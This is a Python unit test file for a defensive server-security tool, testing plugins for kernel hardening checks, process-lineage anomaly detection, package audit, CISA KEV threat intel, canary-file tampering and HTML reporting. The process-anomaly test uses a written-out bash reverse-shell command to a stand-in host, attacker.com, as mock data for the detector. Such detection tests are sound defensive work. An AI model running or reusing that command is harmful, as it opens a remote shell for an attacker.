"""Unit tests for Server 0-Day Defense, Threat Intelligence, and Behavioral Anomaly plugins."""
from __future__ import annotations
import sys, os, tempfile, shutil
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from sentinel.core.models import Finding, Severity, FindingType
from sentinel.core.orchestrator import Orchestrator
from sentinel.core.report import render
from sentinel.core.plugins.host_harden_plugin import HostHardenPlugin
from sentinel.core.plugins.process_anomaly_plugin import ProcessAnomalyPlugin
from sentinel.core.plugins.pkg_audit_plugin import PkgAuditPlugin
from sentinel.core.plugins.threat_intel_plugin import ThreatIntelPlugin, _query_epss
from sentinel.core.plugins.canary_audit_plugin import CanaryAuditPlugin


def test_host_harden_plugin():
    plugin = HostHardenPlugin()
    assert plugin.name == "host_harden"
    assert plugin.stage == "audit"

    # Test mock sysctl audit
    class MockHardenPlugin(HostHardenPlugin):
        def _read_sysctl(self, path: str):
            if "randomize_va_space" in path:
                return "2"
            if "unprivileged_userns_clone" in path:
                return "0"
            if "kptr_restrict" in path:
                return "2"
            return "1"

    mp = MockHardenPlugin()
    findings = list(mp._audit_linux_kernel())
    assert len(findings) >= 3
    aslr_f = next(f for f in findings if "randomize_va_space" in f.value)
    assert aslr_f.severity == "info"
    assert "Full ASLR enabled" in aslr_f.detail


def test_process_anomaly_plugin():
    plugin = ProcessAnomalyPlugin()
    assert plugin.name == "process_anomaly"
    assert plugin.stage == "audit"

    # Test suspicious lineage: nginx (pid 100) -> bash (pid 200)
    mock_procs = {
        100: {"comm": "nginx", "ppid": 1, "cmdline": "nginx: worker process"},
        200: {"comm": "bash", "ppid": 100, "cmdline": "/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1"},
        300: {"comm": "systemd", "ppid": 0, "cmdline": "/sbin/init"},
    }

    findings = list(plugin._audit_lineage(mock_procs))
    assert len(findings) == 1
    f = findings[0]
    assert f.severity == "critical"
    assert f.metadata["threat_category"] == "0day_rce_execution"
    assert "CRITICAL 0-DAY RCE INDICATOR" in f.detail


def test_pkg_audit_plugin():
    plugin = PkgAuditPlugin()
    assert plugin.name == "pkg_audit"
    assert plugin.stage == "scan"

    # Verify python package extraction
    py_pkgs = plugin._get_python_packages()
    assert isinstance(py_pkgs, list)


def test_threat_intel_plugin():
    plugin = ThreatIntelPlugin()
    assert plugin.name == "threat_intel"
    assert plugin.stage == "intel"

    class MockContext:
        discovered_cves = ["CVE-2023-38606"]
        all_findings = []

    # Mock CISA KEV set
    import sentinel.core.plugins.threat_intel_plugin as tip
    tip._KEV_CACHE = {"CVE-2023-38606"}
    tip._KEV_LOADED = True

    ctx = MockContext()
    findings = list(plugin.run("localhost", ctx))
    assert len(findings) >= 1
    kev_f = next(f for f in findings if "CISA KEV" in f.value)
    assert kev_f.severity == "critical"
    assert kev_f.metadata["in_the_wild"] is True


def test_canary_audit_plugin():
    plugin = CanaryAuditPlugin()
    assert plugin.name == "canary_audit"
    assert plugin.stage == "audit"

    # Test canary tripwire detection with temp file
    td = tempfile.mkdtemp()
    try:
        canary_file = os.path.join(td, "id_rsa.canary")
        with open(canary_file, "w") as f:
            f.write("DUMMY_KEY_CONTENT")

        base_hash = plugin._hash_file(canary_file)

        # Tamper the file (simulate unauthorized attacker modification)
        with open(canary_file, "a") as f:
            f.write("\nTAMPERED")

        curr_hash = plugin._hash_file(canary_file)
        assert base_hash != curr_hash
    finally:
        shutil.rmtree(td, ignore_errors=True)


def test_report_renders_server_defense():
    findings = [
        Finding(
            tool="host_harden",
            finding_type="hardening",
            value="kernel.randomize_va_space = 2",
            target="localhost",
            severity="info",
            detail="Full ASLR enabled",
            metadata={"mitigation": "ASLR"}
        ).to_dict(),
        Finding(
            tool="threat_intel",
            finding_type="vulnerability",
            value="CISA KEV Active Exploit: CVE-2023-38606",
            target="localhost",
            severity="critical",
            detail="Active in-the-wild exploitation confirmed",
            metadata={"cisa_kev": True, "epss_score": 0.85}
        ).to_dict(),
    ]
    html = render(findings, title="Server Defense Audit")
    assert "<!doctype html>" in html
    assert "Server 0-Day &amp; Exploit Mitigations Matrix" in html
    assert "CISA KEV" in html
    assert "EPSS 85.0%" in html
    assert "IN THE WILD" in html


if __name__ == "__main__":
    for fn in (
        test_host_harden_plugin,
        test_process_anomaly_plugin,
        test_pkg_audit_plugin,
        test_threat_intel_plugin,
        test_canary_audit_plugin,
        test_report_renders_server_defense,
    ):
        try:
            fn()
            print(f"PASS {fn.__name__}")
        except Exception as e:
            print(f"FAIL {fn.__name__}: {e}")
            sys.exit(1)
    print("ALL SERVER DEFENSE TESTS PASSED")
